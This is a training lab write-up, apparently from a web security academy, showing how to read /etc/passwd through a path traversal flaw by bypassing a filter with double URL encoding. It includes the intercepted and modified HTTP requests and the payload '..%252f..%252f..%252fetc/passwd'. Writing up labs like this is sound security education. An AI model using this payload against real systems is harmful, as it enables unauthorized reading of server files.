# Lab: File Path Traversal, Traversal Sequences Stripped with Superfluous URL-Decode

## Objective

Exploit the path traversal vulnerability in the product image functionality to retrieve the contents of the `/etc/passwd` file.

## Vulnerability

The application blocks input containing path traversal sequences such as `../`. However, it performs an additional URL decode operation before using the input. This allows an attacker to bypass the filter by using double URL encoding.

## Steps 

1. Open the lab and navigate to any product page.
2. Intercept the request for the product image using **Burp Suite**.
3. Identify the request containing the `filename` parameter.

### Original Request

```http
GET /image?filename=218.png HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

4. Modify the `filename` parameter to:

```text
..%252f..%252f..%252fetc/passwd
```

### Modified Request

```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
```

5. Forward the request.



The server returns the contents of the `/etc/passwd` file, confirming that the application is vulnerable to Path Traversal.



## Payload Used

```text
..%252f..%252f..%252fetc/passwd
```
## Explanation

The application blocks direct traversal sequences (`../`) before processing the input. However, it performs an additional URL decode operation afterwards.

The payload:

```text
..%252f..%252f..%252fetc/passwd
```

is decoded once to:

```text
..%2f..%2f..%2fetc/passwd
```

and then decoded again to:

```text
../../../etc/passwd
```

which is interpreted by the operating system as:

```text
/etc/passwd
```

Thus, the attacker is able to bypass the filter and access files outside the intended directory.
